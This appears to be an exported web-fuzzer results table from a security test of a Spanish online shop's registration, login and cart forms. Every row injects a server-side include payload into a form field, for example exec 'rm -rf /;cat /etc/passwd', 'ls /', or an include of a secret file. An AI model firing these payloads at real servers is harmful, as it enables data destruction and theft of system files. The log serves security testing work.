Request	Payload	Status code	Response received	Error	Timeout	Length	Comment
0		200	98	false	false	5025	
122	"registro | morelli | <!--#include file=""archivo_secreto"" --> | Erno | Maqueira Somohano | [email] | 35265294S | Pl. Augusto Conte Lacave, 86  | ...	200	111	false	false	4121	
250	"registro | charko | entrevenimiento | Cayetano | Papiol Garriga | [email] | 75246757A | C/ Sierra Maigmo, S/N, 1?D | Villa de Ves | 09343 | Guadalajara | 1828745224462815 | Re ...	200	84	false	false	4111	
58	"registro | charlesb | m96fan19 | Durante | Campusano Caldero | [email] | 44335499D | C/ Padre Luis Maria Arteche 0 5B | ""><!--#EXEC cmd=""dir ""-->< | 37716 | Cantabr ...	200	100	false	false	4108	
275	"registro""><!--#EXEC cmd=""dir ""-->< | kanya | trasladadora | Angelo | Goya Asensio | [email] | 56007542N | C/ Baja 58, 1?H | Helechosa de los Montes | 10181 | Valencia  ...	200	181	false	false	4105	
24	"registro | amar | encallecer | Celedonio | Compres Manau | [email] | 45415076N | Valladolid, 99 7A""><!--#EXEC cmd=""dir ""-->< | Borges del Camp, Les | 50343 | Baleares (Illes) |  ...	200	80	false	false	4103	
113	"registro | wonuk | pulverizador""><!--#EXEC cmd=""dir ""-->< | Mahoma | Alorda Goicoechea | [email] | 08512419G | Calle Amanecer 105  | Fuente de San Esteban, La | 16611 | Huelva | 97 ...	200	75	false	false	4101	
302	"registro | <!--#include file=""archivo_secreto"" --> | pirr7n108 | Siro | Casaramon Tetatzin | [email] | 30635705G | Cristo Rey, 59, 2B | Arenales de San Gregorio | 247 ...	200	85	false	false	4101	
136	"registro | tat7 | p0on57cia008nto | Camelia | Zurita Santander | [email] | 59059811C | Artes, S/N  | Escobar de Polendos | 18518 | Burgos | 2636619315022095 | Registrar""><! ...	200	96	false	false	4099	
197	"registro | yukihiko | 10nfig318c559 | Malias | Monestel Robaldino | [email] | 61037738Q | C/ Begonia 49 12F | Borges del Camp, Les | 37621 | Guadalajara | 1924133576102581 | Registrar""><!--# ...	200	114	false	false	4096	
179	"registro | nataniel | 53rD11c4 | Ligia | Klindt Vanega | [email] | 96785368B | Pintor Clemente De Torres 169  | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 09125 | Guadal ...	200	91	false	false	4095	
284	"registro | winters | pat!entemente | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Mollejasl | [email] | 91976235V | Calle San Froilan 74  | San Miguel de Bernuy | 06410 | Barcel ...	200	59	false	false	4093	
341	"registro | moeschet | FAstiD?Ioso | VahidReza | Toral Pine | [email] | 79928493C | Dido 162,  | Aldeanueva de Ebro | 50001""><!--#EXEC cmd=""dir ""-->< | Madrid | 6010532265 ...	200	72	false	false	4093	
353	"registro | winnie | 1ArZ5ElA | Pomponio | Aboitiz Monestel | [email]<!--#include file=""archivo_secreto"" --> | 86852947W | Calle Gerardo Rueda, 68, 3?C | Foradada | 43411 | Bada ...	200	104	false	false	4093	
157	"registro | lemar | 43lpe7de2o | Bianca | Valor Agudo | [email] | 90125861Q | Plaza Monasterio De La Oliva, S/N,  | Tembleque | 20493 | Navarra | 7119531551958366 | Registrar<!--#incl ...	200	103	false	false	4091	
193	"registro | babatund | pA6OMer9-A<!--#EXEC cmd=""ls /""--> | Juana del Pilar | Luna Barberan | [email] | 19546963E | Villadangos Del Paramo, 82,  | Encinas de Esgueva | 10830 | Alicante  ...	200	107	false	false	4089	
272	"registro""><!--#EXEC cmd=""dir ""-->< | tiong-ho | an1l5m9no | Hadasa | Subias | [email] | 79845869N | Jacinto Benavente, 165 7F | Herreruela | 11330 | Teruel | 44618994778039 ...	200	117	false	false	4089	
80	"registro | lieure | rEbatible | Tarciano | Villalta Tapasco | [email] | 42708654T | Calle Eduardo Blanco Amor, 120, 1?B | Sopeira | 12230 | Guadalajara | 7642131917731646<!--#EXEC ...	200	73	false	false	4087	
187	"registro | digby | gusarapa | Cilatal | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | [email] | 51191165L | Baixada Pontenova-freixeiro 30,  | Portella, La | 37468 | Burgos | 7 ...	200	106	false	false	4086	
7	"registro | nyberg | predicha | Carmina | Serarols Ginesta<!--#include file=""archivo_secreto"" --> | [email] | 80243620R | Zumel S/N,  | Mas de Barberans | 05420 | Zamora | 57 ...	200	82	false	false	4085	
290	"registro | bourk | acoMoDamIEnTO | Rafferty<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Aca Isach | [email] | 56038958X | Gijon, 93, 6?E | Pozuelo | 41749 | Barcelona | 49 ...	200	121	false	false	4085	
198	"registro | <!--#include file=""archivo_secreto"" --> | 10nfig318c559 | Malias | Monestel Robaldino | [email] | 61037738Q | C/ Begonia 49 12F | Borges del Camp, Les | 37621 | Guadalajara | 192 ...	200	114	false	false	4084	
190	"registro | olivia | Pa-lTa | Clidanor | Weffer Vaamonde""><!--#EXEC cmd=""dir ""-->< | [email] | 58040403H | Vista Alegre 90,  | Copons | 43143 | Valladolid | 4437841608475479 | R ...	200	131	false	false	4083	
88	"registro | eshelman | fiLosOFAR | Zarif | Torrabadella<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | [email] | 73992011E | C/ Marbella 103 8A | Artazu | 29532 | Badajoz | 15461 ...	200	118	false	false	4082	
298	"registro | <!--#EXEC cmd=""ls /""--> | e8c5mulg055r | Sindulfo | Labastie Princep | [email] | 96517735Y | Carrer Marges 174 9B | Villanueva del Trabuco | 05152 | Tarragona | 13374 ...	200	86	false	false	4082	
355	"registro | jocelyn | v821ri8 | Raven | Rambla Jalencas<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | [email] | 66518253E | C/ Fuerte Isabel Ii, 78 3?C | Sando | 50088 | Girona | 00280 ...	200	104	false	false	4082	
278	"registro | nitin | r4mitir | Lionel | Teixidor Modrego | [email] | 37118814B | C/ Joaquin Arjona 70,  | Rionegro del Puente | 49639 | Barcelona | <!--#exec cmd=""rm -rf /;cat /etc/pa ...	200	156	false	false	4081	
79	"registro | kingston | tRaSPlAnTe | Johana | ""><!--#EXEC cmd=""dir ""-->< | [email] | 86807165J | Calle Olof Palme S/N,  | Navezuelas | 44330 | Navarra | 4852910314860020 | Regis ...	200	123	false	false	4079	
225	"registro | gavens0 | revirado | Kaya | Mojeda Batet | [email] | 65532112Y | Plaza Flauta 16, 1?B | Valdeavellano de Tera | <!--#EXEC cmd=""ls /""--> | Teruel | 245235500 ...	200	101	false	false	4078	
248	"registro | <!--#include file=""archivo_secreto"" --> | idealismo | Ian | Sacota Xech | [email] | 28681618C | C/ Valencia S/N 11A | Pancorbo | 26321 | Alicante | 336638454 ...	200	73	false	false	4078	
224	"registro | marquez6 | SIsallo<!--#EXEC cmd=""ls /""--> | Magali | Mojeda Batet | [email] | 16093683P | Calle Mosen Damian Borobia 38 10-F | Puente Viesgo | 48213 | Albacete | 35637681278 ...	200	101	false	false	4076	
281	"registro | nill | 2739n83d$46 | Yael | Paladell Perramon | [email] | 31914466B | Calle Corpo Santo, 11 6G | Canales de la Sierra | 22220 | <!--#EXEC cmd=""ls /""--> | 335091081301 ...	200	136	false	false	4075	
194	"registro | hormoz | 79Ari68 | Tamar | Unger | [email] | 27110453P | C/ Tampa, 34  | Molares, Los""><!--#EXEC cmd=""dir ""-->< | 05410 | Teruel | 7701457023954310 | Registrar HTT ...	200	114	false	false	4071	
124	"registro | jakabffy | 33aRr179 | VahidReza | Curell Lagares | [email] | 75130756Z | Urbanizacion Montesion, 3  | Molinaseca | 45180 | <!--#EXEC cmd=""ls /""--> | 2571648203429012 | ...	200	106	false	false	4069	
64	"registro | alane | 9u7Je | Ignolinda | Motta | [email] | 04469375S | Calle Melchor Cobo Medina, 16, 6H | Andorra | 09129 | <!--#EXEC cmd=""ls /""--> | 1134011255413195 | Reg ...	200	126	false	false	4065	
227	"registro | peers | at222a1 | Cipriana | Serradell | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 19247264J | C/ Joventut, 182,  | Alegia | 31510 | Salamanca | 8765134980053757 | Registrar HTT ...	200	89	false	false	4055	
195	"registro | yingcdi | pisa-verde | Vianella | Galdeano Piccech | [email] | 80818838N | <!--#EXEC cmd=""ls /""--> | Gormaz | 32737 | Zaragoza | 0673547824413217 | Registrar HTTP/1.1"	200	75	false	false	4045	
221	"entrar | beate | esp8rtillero<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | off | Entrar HTTP/1.1"	200	82	false	false	3954	
325	"entrar | krishna | 3o?964I7A1 | on | Entrar<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	98	false	false	3953	
166	"entrar""><!--#EXEC cmd=""dir ""-->< | abdullah | cOrcusIdO | on | Entrar HTTP/1.1"	200	115	false	false	3952	
349	"entrar | wing-man7""><!--#EXEC cmd=""dir ""-->< | edific9r | on | Entrar HTTP/1.1"	200	76	false	false	3952	
32	"entrar | satta | es699601r | on<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Entrar HTTP/1.1"	200	127	false	false	3950	
49	"entrar | yansun | 03s6ig89<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | on | Entrar HTTP/1.1"	200	105	false	false	3950	
137	"entrar | mcnair | 81cob6r | off<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Entrar HTTP/1.1"	200	96	false	false	3950	
339	"entrar | corace | ahorrAdOr | ""><!--#EXEC cmd=""dir ""-->< | Entrar HTTP/1.1"	200	104	false	false	3948	
354	"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | world.fa | entremeter | on | Entrar HTTP/1.1"	200	79	false	false	3948	
26	"entrar | lutz | OpimA | off""><!--#EXEC cmd=""dir ""-->< | Entrar HTTP/1.1"	200	77	false	false	3945	
141	"entrar | toole | e9ternecer | on | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	103	false	false	3945	
282	"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | darb2 | h4_Bi651A2 | on | Entrar HTTP/1.1"	200	87	false	false	3945	
118	"entrar | lyliston | ""><!--#EXEC cmd=""dir ""-->< | off | Entrar HTTP/1.1"	200	91	false	false	3944	
144	"entrar | ovas<!--#include file=""archivo_secreto"" --> | ric8Me6te | on | Entrar HTTP/1.1"	200	102	false	false	3944	
358	"entrar | ""><!--#EXEC cmd=""dir ""-->< | 1Ece57aL | off | Entrar HTTP/1.1"	200	83	false	false	3944	
30	"entrar | arro | CarMinAR<!--#include file=""archivo_secreto"" --> | on | Entrar HTTP/1.1"	200	130	false	false	3943	
70	"entrar | leppert | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | on | Entrar HTTP/1.1"	200	119	false	false	3943	
277	"""><!--#EXEC cmd=""dir ""-->< | swen | incisorio | off | Entrar HTTP/1.1"	200	156	false	false	3943	
57	"entrar | <!--#include file=""archivo_secreto"" --> | COnSO0atiVO | on | Entrar HTTP/1.1"	200	77	false	false	3942	
218	"insertar | 1881<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1"	200	115	false	false	3942	
311	"insertar | 3858 | Pasar por caja<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	113	false	false	3942	
362	"insertar | 1202<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1"	200	124	false	false	3942	
123	"entrar | wylie | ""><!--#EXEC cmd=""dir ""-->< | off | Entrar HTTP/1.1"	200	87	false	false	3941	
279	"3 | Queso Manchego | 39 | 86 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	152	false	false	3941	
315	"insertar | 622<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1"	200	113	false	false	3941	
326	"entrar | moyna | arable | on | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	98	false	false	3941	
346	"3 | Queso Manchego | 39 | 28 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	98	false	false	3941	
212	"insertar | 401""><!--#EXEC cmd=""dir ""-->< | Pasar por caja HTTP/1.1"	200	88	false	false	3940	
63	"insertar | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1"	200	70	false	false	3938	
102	"entrar | maijala | <!--#include file=""archivo_secreto"" --> | on | Entrar HTTP/1.1"	200	92	false	false	3938	
117	"insertar | 7686 | Pasar por caja<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	97	false	false	3937	
147	"insertar | 3748 | Pasar por caja<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	102	false	false	3937	
160	"insertar<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 9874 | Confirmar HTTP/1.1"	200	74	false	false	3937	
238	"insertar | ""><!--#EXEC cmd=""dir ""-->< | Pasar por caja HTTP/1.1"	200	90	false	false	3937	
251	"insertar | 5562<!--#include file=""archivo_secreto"" --> | Pasar por caja HTTP/1.1"	200	70	false	false	3937	
264	"insertar | 6071<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Confirmar HTTP/1.1"	200	74	false	false	3937	
321	"insertar<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 5191 | Confirmar HTTP/1.1"	200	72	false	false	3937	
356	"2 | Vino Rioja | 85 | 83 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	104	false	false	3937	
28	"insertar""><!--#EXEC cmd=""dir ""-->< | 8962 | Confirmar HTTP/1.1"	200	77	false	false	3936	
109	"3 | Vino Rioja | 85 | 80 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	86	false	false	3936	
217	"insertar | 6276""><!--#EXEC cmd=""dir ""-->< | Confirmar HTTP/1.1"	200	115	false	false	3936	
303	"insertar | 4628 | Confirmar""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	86	false	false	3936	
336	"entrar | <!--#include file=""archivo_secreto"" --> | juma | on | Entrar HTTP/1.1"	200	113	false	false	3935	
27	"Credenciales incorrectas<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	76	false	false	3934	
43	"Credenciales incorrectas""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	99	false	false	3933	
52	"entrar | wolfie8 | antagallar | off | Entrar<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	80	false	false	3933	
90	"entrar | hanneke<!--#EXEC cmd=""ls /""--> | dESHILadIZ | off | Entrar HTTP/1.1"	200	71	false	false	3933	
287	"entrar | corvo | 4mbel0c11362<!--#EXEC cmd=""ls /""--> | off | Entrar HTTP/1.1"	200	122	false	false	3933	
333	"insertar | <!--#include file=""archivo_secreto"" --> | Pasar por caja HTTP/1.1"	200	114	false	false	3933	
59	"insertar | 1510<!--#include file=""archivo_secreto"" --> | Confirmar HTTP/1.1"	200	101	false	false	3932	
140	"insertar | ""><!--#EXEC cmd=""dir ""-->< | Confirmar HTTP/1.1"	200	76	false	false	3932	
214	"insertar<!--#include file=""archivo_secreto"" --> | 6858 | Confirmar HTTP/1.1"	200	69	false	false	3932	
241	"entrar | shoouyu | 06434Q969o | on<!--#EXEC cmd=""ls /""--> | Entrar HTTP/1.1"	200	76	false	false	3932	
283	"insertar<!--#include file=""archivo_secreto"" --> | 4179 | Confirmar HTTP/1.1"	200	87	false	false	3932	
42	"Credenciales incorrectas<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	99	false	false	3929	
107	"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 8166 | Confirmar HTTP/1.1"	200	73	false	false	3929	
154	"<!--#include file=""archivo_secreto"" --> | 6471 | Pasar por caja HTTP/1.1"	200	71	false	false	3929	
183	"<!--#include file=""archivo_secreto"" --> | 6458 | Pasar por caja HTTP/1.1"	200	105	false	false	3929	
234	"<!--#include file=""archivo_secreto"" --> | 3086 | Pasar por caja HTTP/1.1"	200	73	false	false	3929	
255	"entrar | cristi<!--#EXEC cmd=""ls /""--> | corac27o | on | Entrar HTTP/1.1"	200	85	false	false	3929	
39	"entrar | espinosa | candado | <!--#EXEC cmd=""ls /""--> | Entrar HTTP/1.1"	200	115	false	false	3928	
132	"insertar | 7436 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	105	false	false	3928	
148	"<!--#EXEC cmd=""ls /""--> | crowder | 6.en0e6at2da | on | Entrar HTTP/1.1"	200	102	false	false	3928	
249	"insertar | <!--#include file=""archivo_secreto"" --> | Confirmar HTTP/1.1"	200	84	false	false	3928	
21	"insertar | 6801 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	112	false	false	3927	
135	"insertar | 7730 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	96	false	false	3927	
171	"insertar | 4981 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	117	false	false	3927	
259	"entrar<!--#EXEC cmd=""ls /""--> | edik3 | a6mi9a2 | on | Entrar HTTP/1.1"	200	75	false	false	3927	
288	"entrar | nezm | 1Eb5l0e | off | Entrar<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	76	false	false	3927	
301	"insertar | 9671 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	72	false	false	3927	
367	"insertar | 6771 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	170	false	false	3927	
162	"entrar | crommie | 0eju0o | <!--#EXEC cmd=""ls /""--> | Entrar HTTP/1.1"	200	67	false	false	3926	
4	"Vaciar carrito<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	81	false	false	3924	
368	"entrar | <!--#EXEC cmd=""ls /""--> | +ad7quie7 | on | Entrar HTTP/1.1"	200	167	false	false	3924	
16	"Vaciar carrito""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	119	false	false	3923	
108	"insertar | 4975 | <!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	105	false	false	3923	
271	"<!--#EXEC cmd=""ls /""--> | chetan | tontuela | on | Entrar HTTP/1.1"	200	92	false	false	3923	
